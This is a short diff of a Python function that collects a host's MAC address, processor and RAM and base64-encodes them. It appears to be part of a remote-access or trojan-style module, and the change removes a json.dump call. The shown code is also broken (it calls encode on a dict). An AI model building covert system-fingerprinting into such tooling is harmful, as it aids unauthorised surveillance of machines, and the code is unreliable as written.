@@ -12,7 +12,6 @@ def run(**args):
     info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
     info['processor']=platform.processor()
     info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-    json.dump(info)
     # encode info to base64 
     message_bytes = info.encode('ascii')
     base64_bytes = base64.b64encode(message_bytes)
